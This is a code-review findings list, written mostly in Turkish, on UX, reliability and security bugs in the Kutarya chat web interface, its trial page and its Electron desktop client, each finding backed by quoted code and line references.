### Sunucuya bağlanamama durumu kullanıcıya hiç gösterilmiyor
`D:/Kutarya/KutaryaChatUI/js/app.js`:376

getProps() hata durumunda null döner (api.js:52 `catch { return null; }`), loadProps bunu sessizce yutup varsayılan rozeti basar. Rozet 'Kutarya Us / 4B / Önizleme' göründüğü için arayüz bağlıymış gibi durur; contextWindow 0 kaldığından bağlam halkası da sürekli boştur. Kullanıcı sorunu ancak mesaj gönderdikten sonra ham tarayıcı hatasıyla ("Failed to fetch" / "HTTP 404 File not found") öğrenir. Bu senaryo varsayılan kurulumda kesindir: dev-server.py 8931'de çalışır, apiBase varsayılanı '' (aynı origin) olduğu için /props ve /v1/chat/completions dev sunucuya gider ve 404 döner; kullanıcı Settings'ten adresi elle girmedikçe hiçbir şey çalışmaz, ama arayüzde bunu söyleyen tek bir işaret yok.

> app.js:377-381 `if (!props) { // Sunucu yoksa arayuz yine calisir; rozet varsayilan kalir.\n    renderModelBadge();\n    return;\n  }` ; store.js:41 `apiBase: '',` ; dev-server.py `srv = ThreadingHTTPServer(("127.0.0.1", port), handler)` (port 8931)

### İlk token'a kadar yükleniyor göstergesi yok — boş balon
`D:/Kutarya/KutaryaChatUI/js/app.js`:609

Gönderdikten sonra model ilk token'ı üretene kadar (yerel 4B modelde saniyeler sürebilir) asistan mesajı tamamen boş görünüyor: content '' olduğu için markdown gövdesi boş, akış sırasında aksiyon çubuğu da basılmıyor, sadece model rozeti duruyor. Ne shimmer, ne pulse, ne "düşünüyor" göstergesi var — kullanıcı isteğin gidip gitmediğini anlayamıyor. bundle.css'te bunun için hazır `@keyframes shimmer` ve `.animate-pulse` VAR ama kullanılmıyor.

> app.js:619-627 `const actions = streaming ? '' : actionsHtml(...)` ; app.js:635 `markdownHtml(msg.content, '', 'data-md-text=""')` (msg.content === '') ; grep -c -F '@keyframes shimmer' css/bundle.css => 1

### Mobilde sohbet seçince / yeni sohbet açınca kenar çubuğu kapanmıyor
`D:/Kutarya/KutaryaChatUI/js/app.js`:1443

Genişletilmiş aside mobilde tüm ekranı kaplar (w-[calc(100dvw-1rem)] + setSidebarExpanded'in eklediği h-[calc(100dvh-1rem)] + is-expanded arka plan bulanıklığı). Ancak handleConversationAction('select') ve newChat() yalnız render() çağırıyor, setSidebarExpanded(false) çağırmıyor. Kullanıcı bir sohbete dokunduktan sonra hâlâ tam ekran kenar çubuğuna bakıyor; kapatmak için ayrıca logoya dokunması gerekiyor. Ayrıca dışarı tıklayınca kapatma (backdrop dismiss) ve Esc ile kapatma da yok.

> app.js:1444-1451 `if (action === 'select') { ... setCurrent(convId); editingId = null; stickToBottom = true; render(); return; }` — setSidebarExpanded yok ; app.js:1499-1506 `function newChat() { ... render(); if (dom.input) dom.input.focus(); }` ; app.js:1524-1525 SIDEBAR_EXPAND_CLASSES = ['h-[calc(100dvh-1rem)]', 'md:w-72', ...]

### Mobilde sohbet listesi kaydırılamıyor (overflow yalnız md: kırılımında)
`D:/Kutarya/KutaryaChatUI/js/app.js`:795

Sohbetleri saran iç kap `min-h-0 flex-1 md:overflow-y-auto` sınıfını taşıyor; `md:` öneki yüzünden 768px altında overflow-y kuralı hiç uygulanmıyor. Kenar çubuğu mobilde sabit yükseklikte (h-[calc(100dvh-1rem)], flex flex-col justify-between) olduğundan, sohbet sayısı ekrana sığmadığında liste taşar ve alttaki kayıtlara erişilemez. index.html'deki #conversation-list üzerindeki `overflow-y-auto` sınıfı da renderConversations ilk satırda className'i tamamen ezdiği için kayboluyor.

> app.js:795 `'<div class="min-h-0 flex-1 md:overflow-y-auto">' +` ; app.js:741-743 `host.className = 'mt-2 flex min-h-0 flex-1 flex-col gap-4 md:gap-0 whitespace-nowrap px-2' + (expanded ? '' : ' hidden');` — index.html:109'daki `class="px-2 flex-1 overflow-y-auto"` böylece siliniyor.

### Sohbet ve mesaj silme onaysız ve geri alınamaz
`D:/Kutarya/KutaryaChatUI/js/app.js`:1454

Hem sohbet silme hem mesaj silme doğrudan store'dan siliyor; onay diyaloğu, undo toast'ı veya çöp kutusu yok. Rename için diyalog yazılmış olmasına rağmen (aynı fonksiyonun hemen altında) çok daha yıkıcı olan Delete için hiçbir koruma yok. Silinen sohbet localStorage'dan da 250ms içinde kalıcı olarak gidiyor.

> app.js:1454-1459 `if (action === 'delete') { if (stream && stream.convId === convId) stopStream(); deleteConversation(convId); render(); return; }` ; app.js:1161-1164 `if (!conv) return; deleteMessage(conv.id, msgId); render();`

### Üretim boş dönerse asistan mesajı siliniyor — yeniden deneme yolu kalmıyor
`D:/Kutarya/KutaryaChatUI/js/app.js`:1045

İstek hata verdiğinde veya hiç token gelmediğinde boş asistan balonu store'dan siliniyor. Regenerate düğmesi yalnız var olan bir asistan mesajının aksiyon çubuğunda bulunduğu için, hatadan sonra tekrar denemenin tek yolu kullanıcı mesajını Edit'leyip kaydetmek. Toast 4 saniye sonra kayboluyor ve geriye hata olduğuna dair hiçbir iz kalmıyor — kullanıcı mesajı gönderilmiş gibi duruyor ama cevap yok.

> app.js:1045-1048 `// Hicbir sey uretilmediyse bos asistan balonunu birakma.\n  if (!content && !reasoning) {\n    deleteMessage(s.convId, s.msgId);\n  }` ; app.js:624 `['regenerate', 'Regenerate', 'refresh-cw'],` yalnız assistantMessageHtml içinde üretiliyor.

### Ayarlardaki "System prompt" aslında sistem promptunu değiştirmiyor, ekleniyor
`D:/Kutarya/KutaryaChatUI/js/app.js`:894

Arayüz alanı "System prompt" adını taşıyor ve placeholder'ı "You are a helpful assistant." — yani kullanıcı promptu tamamen değiştirdiğini sanıyor. Gerçekte KTY_US_SYSTEM_PROMPT her zaman gönderiliyor ve kullanıcının yazdığı metin "Ek kullanıcı talimatı:" başlığıyla ARDINA ekleniyor. Ekranda sanal sistem mesajı olarak yalnız kullanıcının yazdığı kısım gösteriliyor, o mesajı Delete etmek de gerçek sistem promptunu kaldırmıyor. Bu davranış hiçbir yerde kullanıcıya söylenmiyor (alanın hint metni yok).

> app.js:894-901 `const hasStoredSystem = list.some((m) => m.role === 'system');\n  if (!hasStoredSystem) { const ek = String(settings.systemPrompt || '').trim();\n    out.push({ role: 'system', content: ek ? \`${KTY_US_SYSTEM_PROMPT}\n\nEk kullanıcı talimatı: ${ek}\` : KTY_US_SYSTEM_PROMPT }); }` ; app.js:1266-1270 field('System prompt', ...) — üçüncü (hint) argümanı verilmemiş.

### Zaman aşımı yok — sunucu yavaş/asılırsa süresiz 'düşünüyor' noktaları
`D:/Kutarya/KutaryaChatUI/js/deneme.js`:277

streamChat'e yalnız signal veriliyor; ne fetch tarafında ne de çağıran tarafta bir süre sınırı (AbortSignal.timeout / setTimeout + abort) var. Sunucu bağlantıyı açık tutup hiç veri göndermezse ekranda üç nokta sonsuza kadar döner; iptal düğmesi de olmadığı için (bkz. ilk bulgu) tek çıkış sayfayı yenilemek — ki bu da kotayı zaten harcamış olur.

> deneme.js:277-291  await streamChat({ messages: istek, signal: akis.signal, onReasoning..., onContent..., onTimings... });   // timeout parametresi yok
> api.js:273-281  const res = await fetch(u('/v1/chat/completions'), { ..., signal });   // süre sınırı yok

### Kotanın sıfırlanması hiç yok — tarayıcı kalıcı olarak kilitleniyor
`D:/Kutarya/KutaryaChatUI/js/deneme.js`:32

SAYAC_KEY yalnızca artan bir sayı tutuyor; zaman damgası, gün penceresi veya sona erme mantığı yok. 5 mesajı harcayan ziyaretçi (ya da yukarıdaki hata yüzünden harcamış sayılan ziyaretçi) o tarayıcıda bir daha ASLA deneyemiyor. 'Deneme' yüzeyi için bu muhtemelen istenen davranış değil; en azından günlük/haftalık pencere veya 'yarın tekrar dene' mesajı bekleniyor. Kullanıcıya gösterilen metin de kalıcılığı belirtmiyor.

> deneme.js:32  const SAYAC_KEY = 'kty-us-deneme-sayac';
> deneme.js:75-81  function kullandiArtir() { localStorage.setItem(SAYAC_KEY, String(kullanilan() + 1)); }   // sıfırlama/pencere yok
> deneme.js:91-93  'Ücretsiz deneme hakkın bitti'

### 5. mesajda 'deneme bitti' paneli, cevap daha akmadan açılıyor ve girdi kilitleniyor
`D:/Kutarya/KutaryaChatUI/js/deneme.js`:264

gonder() içinde sayaç artırıldıktan hemen sonra kotaGuncelle() çağrılıyor. Son (5.) mesaj gönderildiği anda kalan 0 olur; limit-notice görünür, textarea disabled olur ve placeholder 'Devam etmek için giriş yap' olur — model henüz tek kelime yazmamışken. Ziyaretçi son cevabını 'süren bitti' panelinin altında okur; mobilde bu panel ayrıca alt bloğun yüksekliğini büyütüp son mesajın üstünü kapatır.

> deneme.js:257 kullanildiArtir();  ...  deneme.js:264 kotaGuncelle();   // akış 266. satırda başlıyor
> deneme.js:94-101  const bitti = kalan <= 0; if (dom.limit) dom.limit.classList.toggle('hidden', !bitti); if (dom.input) { dom.input.disabled = bitti; ... }

### Kod bloğu 'kopyala' düğmesi bu ekranda hiçbir şey yapmıyor
`D:/Kutarya/KutaryaChatUI/js/deneme.js`:199

renderMarkdown() her kod bloğunun başlığına bir kopyalama düğmesi basıyor. Bu düğmeyi bağlayan tek yer app.js (yani index.html). deneme.js'te [data-copy-code] / .copy-code-btn için hiçbir dinleyici yok — model kod yazdığında düğme görünür, hover'da belirir, tıklanır ve hiçbir şey olmaz. Deneme ekranının ana kullanım senaryolarından biri 'basit-orta düzey kod yazma' olarak duyurulduğu için (bilgi penceresi) bu doğrudan göze çarpar.

> markdown.js:483  '<button type="button" class="copy-code-btn" data-copy-code="" aria-label="Copy code" title="Copy code">'
> markdown.js:468  "Kopyalama dugmesi app.js tarafindan [data-copy-code] ile baglanir"
> app.js:1657  const codeBtn = target.closest('[data-copy-code], .copy-code-btn');   // deneme.js'te karşılığı YOK

### Tema: her koyu-sistemli ilk ziyarette açık→koyu→açık yanıp sönme, üstelik paylaşılan 'theme' anahtarı sessizce eziliyor
`D:/Kutarya/KutaryaChatUI/js/deneme.js`:358

Üç katman birbiriyle çelişiyor: (a) head'deki FOUC betiği 'system'/boş değeri 'light' sayıp açık boyuyor ama localStorage'a YAZMIYOR; (b) initTheme() aynı anahtarı okuyup 'system' buluyor ve prefers-color-scheme: dark ise sayfayı KOYUYA çeviriyor; (c) hemen ardından temaSeciciKur() 'system' görüp setTheme('light') diyerek geri açığa çeviriyor. Sonuç: OS'i koyu olan her ziyaretçide gözle görülür koyu flaş. Ayrıca setTheme localStorage['theme'] anahtarını 'light' olarak KALICI yazıyor — bu anahtar aynı origin'deki tam uygulamayla (index.html / ui.js) ortak, yani deneme sayfasına bir kez uğramak kullanıcının uygulamadaki 'system' tercihini sessizce 'light'a düşürüyor.

> deneme.html:23-27  var mode = localStorage.getItem('theme'); if (mode !== 'light' && mode !== 'dark') mode = 'light';   // yazmıyor
> deneme.js:386  initTheme();   // ui.js:730 themeMode = 'system' → ui.js:683 darkMedia.matches ? 'dark' : 'light'
> deneme.js:357-358  // ui.js 'system'e düşer; bu sayfada system YOK — açık kabul et.\n  if (getTheme() === 'system') setTheme('light');
> ui.js:675 const THEME_KEY = 'theme';  ui.js:705 localStorage.setItem(THEME_KEY, themeMode);   // index.html ile aynı anahtar

### Bütün hatalar tek tip mesaja düşüyor, 'tekrar dene' yolu yok
`D:/Kutarya/KutaryaChatUI/js/deneme.js`:293

api.js hata metnini ayrıntılı üretiyor (HTTP kodu + gövdenin ilk 500 karakteri), ama deneme.js bunu yalnız console'a yazıp kullanıcıya sabit 'Yanıt alınamadı. Lütfen tekrar dene.' gösteriyor. Sunucu kapalı (fetch TypeError), 404/405 (yanlış uç), 500 (model hatası), bağlam taşması ve CORS reddi ziyaretçi için ayırt edilemez. Üstelik 'tekrar dene' deniyor ama tekrar deneme düğmesi yok ve her deneme bir hak yakıyor. Toast 4 saniyede kaybolduğu için geriye yalnız '_Yanıt alınamadı._' satırı kalıyor.

> deneme.js:293-294  console.error('[kty-us] akış hatası', err); toast('Yanıt alınamadı. Lütfen tekrar dene.', 'error');
> api.js:283-290  throw new Error(`HTTP ${res.status} ${res.statusText}${detail ? ` — ${detail}` : ''}`);   // bu ayrıntı kullanıcıya hiç ulaşmıyor

### window.KTY_US_API_BASE hiçbir dosyada tanımlanmıyor — localhost dışında uç noktası boş
`D:/Kutarya/KutaryaChatUI/js/deneme.js`:34

cozApiBase() 'yayında bu global sayfa şablonundan basılır' diyor, ama depoda bu globali yazan tek bir satır bile yok (yalnız okuyan satır var). localhost/127.0.0.1 dışında API_BASE '' kalır ve istek aynı origin'e POST /v1/chat/completions olarak gider; deneme.html'i servis eden statik sunucuda böyle bir uç yok. Yani ekran şu an yalnız geliştirici makinesinde çalışacak durumda — bağlanma parçası yazılmamış.

> deneme.js:36  *   <script>window.KTY_US_API_BASE = 'https://...'</script>
> deneme.js:45  if (window.KTY_US_API_BASE) return window.KTY_US_API_BASE;
> grep -rn "KTY_US_API_BASE" KutaryaChatUI/ → yalnız js/deneme.js:36 ve :45 (hiçbir HTML/şablon dosyasında atama yok)

### Sistem promptu istemciden gönderiliyor — 'ziyaretçi değiştiremez' yorumu gerçeğe aykırı, uç kimliksiz
`D:/Kutarya/KutaryaChatUI/js/deneme.js`:269

Dosya başındaki yorum 'Kimlik SABİTTİR (persona.js) — ziyaretçi değiştiremez' diyor, ama sistem promptu her istekte tarayıcıdan gövdeye konuyor. Ziyaretçi devtools/curl ile KTY_US_SYSTEM_PROMPT'u tamamen değiştirebilir (kimlik kuralları, reddetme kuralları dahil) ve uç sunucuya doğrudan istek atabilir. Kimlik doğrulama, imza veya sunucu tarafı kota yok — kodun kendi yorumu da bunu kabul ediyor. Uç yayına alındığı anda kutarya.com üzerinden herkese açık, sınırsız ve moderasyonsuz çıkarım kapısı olur.

> deneme.js:9   * Kimlik SABİTTİR (persona.js) — ziyaretçi değiştiremez.
> deneme.js:269-274  const istek = [ { role: 'system', content: KTY_US_SYSTEM_PROMPT }, ...mesajlar.slice(0, asistanIndex).map(...) ];
> deneme.js:39-41   * NOT: Kota BURADA, istemcide sayılır — yani teknik olarak aşılabilir
>  *  (localStorage temizlemek yeter). Gerçek sınır, uç sunucuda IP/oturum başına uygulanmalı.

### Türkçe ekranda İngilizce metinler: 'Copy code' ve 'Close'
`D:/Kutarya/KutaryaChatUI/js/markdown.js`:483

Deneme ekranı baştan sona Türkçe, ama iki yerde İngilizce sızıyor: (1) kod bloğu kopyalama düğmesinin native title'ı — fare üzerine gelince tarayıcı 'Copy code' ipucunu gösterir, aria-label de İngilizce; (2) bilgi (i) penceresinin kapatma düğmesinin ekran okuyucu metni 'Close'. İkisi de kullanıcıya (biri görsel, biri ekran okuyucuya) doğrudan görünür.

> markdown.js:483  aria-label="Copy code" title="Copy code"
> ui.js:867  sr.textContent = 'Close';   // openDialog() kapatma düğmesi — bilgiAc() bu diyaloğu kullanıyor (deneme.js:319)

### Türkçe/İngilizce karışıklığı kullanıcıya görünen yerlerde
`D:/Kutarya/KutaryaChatUI/js/persona.js`:22

Arayüzün tamamı İngilizce ("Hello there", "Type a message...", "New chat", "Search", "Settings", "Recent conversations", "Copied", "Forked", "No results."), <html lang="tr"> ise Türkçe. Bu İngilizce yüzeyin ortasına Türkçe metinler karışıyor: (1) model rozetinde "Önizleme" etiketi, (2) rozet tooltip'i/aria-label'ı "Kutarya Us — Düşünerek cevap veren Kutarya modeli", (3) api.js'in Türkçe hata mesajları toast olarak basılıyor. lang="tr" + İngilizce metin ayrıca ekran okuyucu telaffuzunu ve spellcheck'i bozar.

> persona.js:22 `badges: ['4B', 'Önizleme'],` ; app.js:392 `full: \`${KTY_US.displayName} — ${KTY_US.tagline}\`` ; api.js:293 `throw new Error('Yanıt gövdesi akış (ReadableStream) desteklemiyor.');` ; api.js:319 `'Sunucu hatası';` — bunlar app.js:1043 `fail(err && err.message ? err.message : 'Request failed', err)` ile toast'a düşüyor ; index.html:5 `<html lang="tr" ...>` vs index.html:128 `<h1 ...>Hello there</h1>`

### localStorage kotası dolunca kayıt sessizce duruyor
`D:/Kutarya/KutaryaChatUI/js/store.js`:121

storageWrite kota hatasını yakalayıp false döndürüyor ve çağıran hiçbir yer bu dönüş değerini kontrol etmiyor (scheduleSave/writeConversations dönüşü yok sayıyor). Uzun sohbetler + her asistan mesajında saklanan tam model yolu ile 5MB sınırına ulaşıldığında kullanıcı hiçbir uyarı almadan sohbetlerini kaybeder: ekranda her şey normal görünür, sayfa yenilenince son konuşmalar yoktur.

> store.js:121-131 `function storageWrite(key, value) { try { ... ls.setItem(key, value); return true; } catch (_) { // Kota dolu veya yazma yasak — sessizce devam et.\n    return false; } }` ; store.js:269-275 `function writeConversations() { writeJSON(CONVERSATIONS_KEY, {...}); }` — dönüş değeri kullanılmıyor.

### Tanitim seridi 'acilista bir kez' degil, HER sohbet degisiminde yeniden ciiyor
`D:/Kutarya/KutaryaDesktop/src/ChatPanel.jsx`:138

138-143'teki effect bagimlilik dizisi bos ([]) oldugu icin 'bilesen her KURULDUGUNDA' calisir, 'uygulama her acildiginda' degil. Shell.jsx ChatPanel'e key veriyor ve bu key sol listeden bir sohbete tiklaninca (Shell.jsx:207 setSohbetKey(c.id)) ve 'Yeni sohbet' basilinca (Shell.jsx:120) degisiyor -> ChatPanel unmount+mount -> ktyUsPromo useState(false)'a doner, sonra effect tekrar true yapar. Sonuc: kullanici 'Simdi degil' dese bile bir sonraki sohbet tiklamasinda serit geri gelir. Web'de bu sorun yok: ChatPage sohbet degisiminde remount OLMUYOR, onun yerine ktyUsTohum ref'i sifirlaniyor ve serit acikca KAPATILMIYOR (ChatPage.jsx:173-178). Yani masaustu ile web davranisi ayrisiyor ve koddaki '// ACILISTA goster: uygulama her acildiginda bir kez' yorumu gerceklesmiyor.

> ChatPanel.jsx:138-143
>   useEffect(() => {
>     try { if (localStorage.getItem(KTY_US_KAPALI_KEY) === '1') return; } catch {}
>     setKtyUsPromo(true);
>   }, []);
> Shell.jsx:207  onClick={() => { setAktifSohbet(c.id); setSohbetKey(c.id); setGorunum('chat'); }}
> Shell.jsx:297  <ChatPanel key={sohbetKey} ...

### Kendi-anahtar (BYOK) akis dinleyicisi unmount'ta hic kaldirilmiyor
`D:/Kutarya/KutaryaDesktop/src/ChatPanel.jsx`:268

onProviderChunk bir abonelik-birakma fonksiyonu (birak) donduruyor ama bu yalnizca veri.done geldiginde (281) veya kullanici Durdur'a bastiginda (302) cagriliyor. ChatPanel unmount olursa (sohbet degistirme = key degisimi, Ayarlar/Agent gorunumune gecis) dinleyici ipcRenderer uzerinde ASILI KALIR: sonraki parcada olmus bilesenin setMesajlar'i cagrilir ve her yarim kalan BYOK akisi bir dinleyici daha birakir (ipcRenderer 11 dinleyicide MaxListeners uyarisi verir). Ayrica 281-300'deki done blogu akisRef.current'i null'lamiyor (akisli yolda 379'da null'laniyor) -> bayat abort kapanmasi ref'te kaliyor. Dosyada BYOK akisi icin hicbir useEffect cleanup yok.

> ChatPanel.jsx:268  const birak = window.kutarya.onProviderChunk((veri) => { ...
> ChatPanel.jsx:281        birak?.();          // yalniz done'da
> ChatPanel.jsx:302  akisRef.current = { abort: () => { window.kutarya.providerAbort(streamId); birak?.(); } };
> Karsilastirma ChatPanel.jsx:379  akisRef.current = null;   // akisli yolda var, BYOK yolunda YOK

### Gorsel modunda sendChat try/catch'siz: oturum dusunce arayuz kalici olarak kilitleniyor
`D:/Kutarya/KutaryaDesktop/src/ChatPanel.jsx`:325

gonder() icinde ek yukleme (219) ve sohbet olusturma (203) try/catch ile korunmus, ama gorsel uretim dalindaki `await sendChat(istekGovdesi)` korunmamis. sendChat once getToken() cagiriyor; getToken auth.currentUser yoksa Error firlatiyor (api.js:14). O durumda gonder() promise'i reddediliyor, 327'deki setGonderiliyor(false) hic calismiyor: 'yaziyor' noktalari sonsuza kadar doner, gonder dugmesi Durdur olarak kilitli kalir, hicbir hata mesaji gorunmez. (Ag hatasi bu yolu tetiklemez -- apiFetch main.cjs:174'te yakaliyor -- ama oturum/token yenileme hatasi tetikler.) Ayrica ayni dalda 330. satir yalnizca govde.error'a bakiyor, apiFetch'in dondurdugu transport hatasi (cevap.error) yok sayiliyor; kullanici gercek sebep yerine 'Uretim basarisiz oldu.' goruyor.

> ChatPanel.jsx:325  const cevap = await sendChat(istekGovdesi);   // try/catch YOK
> api.js:12-15  export async function getToken(force = false) { const user = auth.currentUser; if (!user) throw new Error('Oturum bulunamadi.'); ... }
> ChatPanel.jsx:330  setHata(govde?.error?.message || 'Uretim basarisiz oldu.');   // cevap.error kullanilmiyor

### Gorsel uretimi sirasinda Durdur dugmesi hicbir sey yapmiyor
`D:/Kutarya/KutaryaDesktop/src/ChatPanel.jsx`:185

gonderiliyor true olunca arayuz her zaman Durdur dugmesini gosteriyor (620-622). Ama akisRef.current yalniz SSE akisinda (366) ve BYOK akisinda (302) doluyor; gorsel uretim dali (324-363) akisRef'i hic set etmiyor. Onceki akis bittiginde 379'da null'landigi icin durdur() bos bir optional-chain cagirisina duser -> tiklamanin gorunur hicbir etkisi olmaz, dugme Durdur olarak kalir ve kullanici uretimin iptal edildigini sanir. (BYOK yolu akisRef'i null'lamadigi icin daha da kotusu mumkun: gorsel uretiminde Durdur'a basmak BAYAT bir streamId'yi abort eder.)

> ChatPanel.jsx:185-187  function durdur() { akisRef.current?.abort?.(); }
> ChatPanel.jsx:620-622  {gonderiliyor ? <button ... onClick={durdur} title="Durdur"> : <button ... onClick={gonder}>}
> ChatPanel.jsx:324  if (mod === 'image' && !gorselEkVar) { const cevap = await sendChat(...)   // akisRef.current atanmiyor

### Yerel yedekten gelen gorsele tiklamak sessizce hicbir sey yapmiyor
`D:/Kutarya/KutaryaDesktop/src/ChatPanel.jsx`:448

Ucretsiz planda sunucudaki kopya supurulunce gorsel diskteki yedekten `data:` URI olarak gosteriliyor (yerelUrller, 102-108). Ayni tiklama isleyicisi bu data URI'yi openExternal'a veriyor; ana surecteki isleyici yalniz http(s) kabul ediyor ve digerlerini sessizce yutuyor (true donduruyor, hata bile degil). Sonuc: sunucu kopyasi duran gorseller buyutulebiliyor, yerel yedekten gelenler tiklaninca hicbir sey olmuyor -- ayni gorunumde iki farkli davranis, kullaniciya hicbir geri bildirim yok. Ayrica bu satirda `window.kutarya.openExternal` optional-chain'siz cagriliyor, ayni dosyadaki tanitim seridi (484) ise `window.kutarya?.openExternal?.()` kullaniyor.

> ChatPanel.jsx:448  onClick={() => window.kutarya.openExternal(yerelUrller[a.storagePath] || mutlakUrl(a.url))}
> electron/main.cjs:788-790  ipcMain.handle('shell:openExternal', (_e, url) => { try { if (url && /^https?:\/\//i.test(String(url))) shell.openExternal(String(url)); return true; } catch { return false; } });
> ChatPanel.jsx:107  setYerelUrller((onceki) => ({ ...onceki, [yol]: `data:${ek.mimeType || 'image/png'};base64,${b64}` }));

### Pencereye dosya birakmak uygulamayi yok ediyor (surukle-birak korumasi yok) ve web'deki ek-birakma ozelligi masaustunde eksik
`D:/Kutarya/KutaryaDesktop/src/ChatPanel.jsx`:430

ChatPanel'de hicbir onDrop/onDragOver yok (grep sonucu: masaustunde yalniz AsistanSohbet.jsx'te var). Web tarafinda ise ChatPage surukle-birak ile ek eklemeyi destekliyor (ChatPage.jsx:499 handleDrop, 919 onDrop, 938 dragActive katmani) -- ayni ozellik iki yuzeyde farkli. Daha ciddi olani: electron/main.cjs'te 'will-navigate' dinleyicisi de yok (yalniz setWindowOpenHandler var, o da yeni PENCERE acilislarini kapsiyor). Chromium'da varsayilan davranis, dragover preventDefault edilmediginde birakilan dosyaya cerceveyi GEZINDIRMEK; boylece kullanici sohbete dosya surukleyince Electron penceresi file:// adresine gidip calisan arayuzu yok eder. did-fail-load kurtarmasi (main.cjs:133) burada devreye girmez cunku gezinme BASARILI olur.

> grep -rn "onDrop|onDragOver" src/ChatPanel.jsx  -> sonuc yok
> grep -rln "onDrop" src/  -> yalniz src/AsistanSohbet.jsx
> grep -n "will-navigate" electron/main.cjs  -> sonuc yok
> Karsilastirma KutaryaAIWeb/src/pages/ChatPage.jsx:919  onDrop={handleDrop}

### Tanitim seridi kaydirilabilir govdenin en altinda: kullanici yukari kaydirmissa hic gorunmuyor
`D:/Kutarya/KutaryaDesktop/src/ChatPanel.jsx`:471

Serit .chat__body'nin (overflow-y: auto, styles.css:379-383) icinde, tum mesajlardan SONRA render ediliyor. Otomatik kaydirma effect'i yalniz [mesajlar, gonderiliyor]'a bagli; ktyUsPromo bagimlilikta YOK. Kullanici gecmisi okumak icin yukari kaydirmissa (altdaRef.current false) serit gorunmez alanda acilir ve kullaniciya hic ulasmaz -- ama ktyUsSonRef o mesaj sayisi icin 'gosterildi' diye isaretlenir, yani o tur atlanir. Web'de bu sorun yok: orada serit mesaj listesinin USTUNDE sabit bir bant (grid-area: notice, global.css:282), her zaman ekranda.

> ChatPanel.jsx:119-121
>   useEffect(() => { if (altdaRef.current) altRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [mesajlar, gonderiliyor]);
> ChatPanel.jsx:471  {ktyUsPromo && ( <div className="chat__ktyus"> ... )}   // 497'deki altRef'ten hemen once, govdenin icinde
> styles.css:379-383  .chat__body { flex: 1; min-height: 0; overflow-y: auto; ... }
> KutaryaAIWeb/src/styles/global.css:282  .chat-notice { grid-area: notice; ... }

### Shell ApiYonetimi'ye olmayan bir prop geciriyor (baglanmamis kod + Ingilizce yorum)
`D:/Kutarya/KutaryaDesktop/src/Shell.jsx`:291

ApiYonetimi'nin imzasi { user, asistan, onIptal } -- 'erisim' diye bir prop almiyor, bilesen kendi icinde ayni isimde bir state tanimliyor (ApiYonetimi.jsx:13). Yani gecirilen erisim={{ plan: 'free' }} sessizce yok sayiliyor: ne hata verir ne calisir, olu prop. Yanindaki yorum da tum kod tabanindaki tek Ingilizce yorumlardan biri ve 'sonra yapacagiz' anlamina geliyor -- yarim birakilmis is isareti.

> Shell.jsx:288-292
>   <ApiYonetimi user={user} asistan={seciliAsistan} onIptal={() => setGorunum('asistan')}
>     erisim={{ plan: 'free' }} // We will fetch actual plan dynamically in the component
>   />
> ApiYonetimi.jsx:12  export default function ApiYonetimi({ user, asistan, onIptal }) {
> ApiYonetimi.jsx:13    const [erisim, setErisim] = useState(undefined);

### Bildirime tiklamak uygulamayi one getirmiyor -- ozellikle 'Onay bekleniyor' icin kritik
`D:/Kutarya/KutaryaDesktop/src/bildirim.js`:45

new Notification(...) hicbir onclick almiyor. Dosyanin kendi yorumu (5. satir) 'Onay ozellikle onemli: cevap gelene kadar is DURUYOR' diyor ve onayGerekiyor() tam da pencere arkadayken bildirim atiyor. Kullanici bildirimi gorup tikliyor, hicbir sey olmuyor; Kutarya penceresini alt-tab ile kendisi bulmak zorunda, o sirada agent bloke bekliyor. Preload'da pencereyi one getirecek bir kopru de yok (grep: focus/show/setAlwaysOnTop icin preload.cjs'te API yok) -- yani bu ozellik ana surec tarafinda hic baglanmamis.

> bildirim.js:44-49
>     if (Notification.permission === 'granted') {
>       new Notification(baslik, { body: govde, silent: true });   // .onclick atanmiyor
>     } else if (...) { ... new Notification(baslik, { body: govde, silent: true }); }
> bildirim.js:68-73  export function onayGerekiyor(neIcin) { ... bildirimGoster('Onay bekleniyor', ...); }

### Bildirim govdesindeki regex bozuk: metindeki her 's' harfi bosluga cevriliyor
`D:/Kutarya/KutaryaDesktop/src/gorevYurutucu.js`:455

Amac bosluklari sadelestirmek (\s+) ama ters bolu yazilmamis: /s+/g literal 's' karakterini eslestiriyor. Gorev bitince bildirim.js:57'deki OS bildiriminin govdesine giden ozet paramparca oluyor: 'Dosyalar basariyla olusturuldu' -> 'Do yalar ba arıyla oluşturuldu'. Bu, kullaniciya gorunen tek gorev-sonu metni; pencere arkadayken gorulen tek sey bu.

> gorevYurutucu.js:455  gorevBitti(String(sonRapor?.content || '').replace(/s+/g, ' ').slice(0, 120));
> bildirim.js:57  bildirimGoster('Gorev tamamlandi', ozet || 'Agent isini bitirdi.');


## DUSUK ÖNEM

### firebase.json'daki '/dene' rewrite'ı gereksiz ve göreli varlık yollarını kırma riski taşıyor
`D:/Kutarya/KutaryaAIWeb/firebase.json`:33

deneme.html tüm varlıklarını göreli yazıyor (./css/bundle.css, ./js/deneme.js, ./assets/kutarya-mark.svg). Hosting'in dizin-index davranışı /dene'yi /dene/'ye 301'lediği sürece bunlar doğru çözülüyor ve rewrite hiç çalışmıyor (rewrite'lar yönlendirmelerden sonra gelir). Ancak rewrite bir gün devreye girerse (ör. trailingSlash: false eklenirse) sayfa /dene adresinde servis edilir ve './css/bundle.css' -> '/css/bundle.css' olarak çözülür; bu yol da '**' catch-all ile index.html'e düşeceği için stil yüklenmez ve modül script'i HTML MIME'ı yüzünden çalışmaz. Ya rewrite kaldırılmalı ya da deneme.html'de mutlak yollar (/dene/...) veya <base href="/dene/"> kullanılmalı.

> firebase.json:32-39  { "source": "/dene", "destination": "/dene/index.html" },
>   { "source": "**", "destination": "/index.html" }
> deneme.html:12,14,15  href="./assets/kutarya-mark.svg" / href="./css/bundle.css" / href="./css/app.css"
> deneme.html:139  <script type="module" src="./js/deneme.js"></script>

### /dene varlıkları hiç önbelleğe alınmıyor (538 KB CSS her ziyarette yeniden iniyor)
`D:/Kutarya/KutaryaAIWeb/firebase.json`:41

'**' başlık kuralı tüm yollara 'no-cache, no-store, must-revalidate' veriyor; uzun ömürlü istisna yalnız '/assets/**' (Vite'ın hash'li çıktısı). /dene/css/bundle.css (538 KB), /dene/js/*.js ve /dene/assets/* bu istisnanın dışında kaldığı için her açılışta yeniden indiriliyor. Bu dosyaların içeriği build'de sabitlenmiş ve hash'siz olduğundan en azından kısa süreli bir Cache-Control verilebilir; mevcut hâl anonim ziyaretçinin ilk izlenimini (mobil bağlantıda) gereksiz yavaşlatıyor.

